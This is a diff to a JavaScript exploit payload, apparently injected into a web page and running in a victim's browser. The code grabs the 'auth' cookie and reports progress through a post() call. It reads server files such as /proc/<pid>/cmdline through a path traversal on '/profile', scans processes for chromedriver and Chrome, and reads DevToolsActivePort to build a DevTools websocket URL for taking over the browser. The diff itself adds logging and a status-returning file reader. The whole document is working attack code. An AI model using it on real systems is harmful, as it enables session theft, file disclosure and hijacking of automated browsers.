@@ -7,6 +7,12 @@ const read=async p=>{
   return await r.text();
  }catch(e){return ''}
 };
+const readx=async p=>{
+ try{
+  let r=await fetch('/profile'+p+'%3f',{cache:'no-store'});
+  return [r.status,await r.text()];
+ }catch(e){return [0,'']}
+};
 const ck=document.cookie.split(';').map(x=>x.trim()).find(x=>x.startsWith('auth='))||document.cookie.split(';')[0]||'';
 post('cdp chain start');
 post(ck?'cookie ok':'cookie none');
@@ -41,6 +47,8 @@ const findDriver=async()=>{
  for(let pid=1;pid<5000;pid++){
   let c=await read('/proc/'+pid+'/cmdline');
   if(!/chromedriver|webdriver/i.test(c))continue;
+  post('driver pid '+pid);
+  post('driver cmd '+c.slice(0,120));
   let m=c.match(/--port=(\d+)/);
   if(m)return 'http://localhost:'+m[1];
  }
@@ -83,8 +91,12 @@ for(let pid=1;pid<5000&&!devtools;pid++){
  if(!m)continue;
  let dir=m[1].replace(/\.+$/,'');
  post('chrome '+pid);
+ if(c.includes('remote-debugging-pipe'))post('rd pipe');
+ if(c.includes('remote-debugging-port'))post('rd port arg');
  post('udir '+dir.slice(0,80));
- let d=await read(dir+'/DevToolsActivePort');
+ let dx=await readx(dir+'/DevToolsActivePort');
+ let d=dx[1];
+ post('dtap '+dx[0]+' '+d.length+' '+d.slice(0,90));
  let q=d.match(/(\d+)\.?(\/devtools\/browser\/[A-Za-z0-9-]+)/);
  if(q)devtools='ws://localhost:'+q[1]+q[2];
 }
